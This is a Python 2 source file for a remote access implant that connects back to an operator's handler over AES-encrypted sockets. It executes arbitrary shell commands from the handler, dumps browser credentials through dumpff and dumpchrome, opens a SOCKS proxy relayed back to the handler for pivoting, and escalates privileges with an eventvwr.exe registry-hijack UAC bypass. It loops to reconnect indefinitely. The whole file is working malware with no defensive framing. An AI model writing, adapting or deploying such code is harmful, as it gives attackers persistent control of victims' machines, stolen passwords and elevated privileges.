#!/usr/bin/env python2
import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob, select, sys, Queue
from Crypto.Cipher import AES
from twisted.internet import reactor
from twisted.protocols import socks
import dumpff
if os.name =="nt":
    import dumpchrome, win32net

HANDLER_IP = "127.0.0.1"

def windows_only(func):
	def tester(*args):
		if os.name != "nt": return "Command not available on non-windows OS."
		else: return func(*args)
	return tester

class StoppableThread(threading.Thread):
	def __init__(self, target):
		super(StoppableThread, self).__init__()
		self.run = target
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()

class Shell:
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
		
		self.killed = False
		self.threads = []
		
	def gen_diffie_key(self):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		print key, IV
	
		return key, IV
		
	def encrypt(self, data):
		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(self.decompress(base64.b64decode(data)))
		
	def compress(self, data):
		return zlib.compress(data, 9)
		
	def decompress(self, data):
		return zlib.decompress(data)

	def connect(self):
		self.comm_socket.connect((self.handler_ip, self.handler_port))
		
		key, IV = self.gen_diffie_key()
		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
		
	def get_data(self):
		data = ""
		while not data.endswith(chr(255)):
			c = self.comm_socket.recv(4096)
			if not c: raise Exception("Handler disconnected")
			data += c
		data = self.decrypt(data)
		return data
		
	def set_package_items(self, items):
		if items == "minimal":
			self.sent_info = ["data"]
		elif items == "small":
			self.sent_info = ["data","cwd"]
		elif items == "userathost":
			self.sent_info = ["data","cwd","username","hostname"]
		else:
			self.sent_info = items.split()
			for item in list(self.sent_info):
				if item not in self.possible_info:
					self.sent_info.remove(item)
			if "data" not in self.sent_info: self.sent_info.append("data")
		return "Now sending "+repr(self.sent_info)
		
	def package(self, data):
		package = {}
		package["cwd"] = base64.b64encode(os.getcwd())
		package["ip"] = base64.b64encode("192.168.1.355")
		package["data"] = base64.b64encode(data)
		package["username"] = base64.b64encode(getpass.getuser())
		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
		package["hostname"] = base64.b64encode(socket.gethostname())

		for key in package.keys():
			if key not in self.sent_info: package[key] = ""
			
		return json.dumps(package)


	def send_data(self, data):
		data_package = self.package(data)
		data_package = self.encrypt(data_package)
		self.comm_socket.sendall(data_package+chr(255))
		
	def kill_proc(self, pid):
		print "kill proc firing"
		process = psutil.Process(pid)
		for proc in process.children(recursive=True):
			proc.terminate()
		process.terminate()
		self.killed = True
		
	def execute_shell_command(self, command):
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		timer = threading.Timer(60, self.kill_proc, [proc.pid])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		if self.killed: out += "\n(Process terminated after taking too long to execute)"
		timer.cancel()
		self.killed = False
		return out
		
	@windows_only
	def windows_only_thing(self):
		print "ass1"
		return "ass"

	@windows_only
	def dumpff(self):
		return dumpff.main()
       
	@windows_only
	def dumpchrome(self):
		return dumpchrome.main()

	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
			
	def tab_complete(self, text):
		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
		
	def socks_proxy_thread(self):
		reactor.listenTCP(2080,socks.SOCKSv4Factory())
		reactor.run()
		
	def start_socks_proxy(self):
		t = StoppableThread(target=self.socks_proxy_thread)
		t.daemon = True
		t.start()
		self.threads.append(t)
		
	def tcp_relay(self):
		current_thread = threading.currentThread()
		while not current_thread.stopped():
			local_socket = socket.socket()
			local_socket.connect(("127.0.0.1",2080))
			
			remote_socket = socket.socket()
			remote_socket.connect((HANDLER_IP,4080))
			
			while not current_thread.stopped():
				try:
					readable, writable, errored = select.select([local_socket, remote_socket], [], [])
				except Exception as e:
					print e
					break
					
				if local_socket in readable:
					try:
						local_data = local_socket.recv(4096)
						if not local_data: break
						remote_socket.sendall(local_data)
					except Exception as e:
						print e
						break
					
				if remote_socket in readable:
					try:
						remote_data = remote_socket.recv(4096)
						if not remote_data: break
						local_socket.sendall(remote_data)
					except Exception as e:
						print e
						break
							
			local_socket.close()
			remote_socket.close()
					
	def create_tcp_relay(self):
		self.start_socks_proxy()
		t = StoppableThread(target=self.tcp_relay)
		t.daemon = True
		t.start()
		self.threads.append(t)
		return "ok"
		
	def stop_tcp_relay(self):
		for t in self.threads:
			t.stop()
		return "[*] Stopped"
		
	def is_admin(self):
		if os.name == "nt":
			return __import__("ctypes").windll.shell32.IsUserAnAdmin() != 0
		else:
			return os.geteuid() == 0
			
	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
		return ''.join([i if ord(i) < 128 else '' for i in string])
     
	@windows_only
	def is_user_in_group(self, group, member): # Check if user is member of a group.
		members = win32net.NetLocalGroupGetMembers(None, group, 1)
		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
		return False
     
	@windows_only
	def name_of_admin_group(self): # Get name of Administrators group.
		for line in self.execute_shell_command("whoami /groups").splitlines():
			if "S-1-5-32-544" in line:
				return line.split()[0].split("\\")[1]
		
	@windows_only
	def bypass_uac(self):
		if self.is_admin():
			return "You already have admin privileges!"
         
		if not self.is_user_in_group(self.name_of_admin_group(), getpass.getuser()):
			return "Current user is not part of admin group."
         
		if not self.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
			return "UAC is disabled or notification policy is set to 'Always'"
			
		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		print self.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
		os.startfile("eventvwr.exe")
		time.sleep(5)
		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		return "A new session with admin privileges should appear in the next 30 seconds."
					
	def handle_command(self, data):
		command = data.split()[0]
		try:
			arguments = " ".join(data.split()[1:])
		except IndexError:
			pass
			
		if command == "test":
			output = self.windows_only_thing()
		elif command == "prompt":
			if not arguments:
				output = "Set to one or more values: cwd, ip, data, hostname, username, localtime; or use preset: minimal, small, userathost"
			else:
				output = self.set_package_items(arguments)
		elif command == "cd":
			output = self.change_directory(arguments)
		elif command == "LIST_FILES":
			if not arguments: arguments = ""
			output = self.tab_complete(arguments)
		elif command == "crash":
			raise Exception("As you wish")
		elif command == "proxy":
			output = "invalid option"
			if arguments == "start":
				output = self.create_tcp_relay()
			elif arguments == "stop":
				output = self.stop_tcp_relay()
		elif command == "dumpff":
			output = self.dumpff()
		elif command == "dumpchrome":
			output = self.dumpchrome()
		elif command == "isadmin":
			return str(self.is_admin())
		elif command == "bypassuac":
			return self.bypass_uac()
		elif command == "die":
			os._exit(0)
		else:
			output = self.execute_shell_command(command+" "+arguments)
			
		return str(output)
		
		
	def run(self):
		while True:
			data = self.get_data()
			if not data.startswith("LIST_FILES"): print data
			output = self.handle_command(data)
			self.send_data(output)
			
while True:
	try:
		shell = Shell(HANDLER_IP, 8080)
		shell.connect()
		shell.run()
	except Exception as e:
		print e
		shell.comm_socket.close()
		for t in shell.threads:
			t.stop()
		time.sleep(10)
		continue
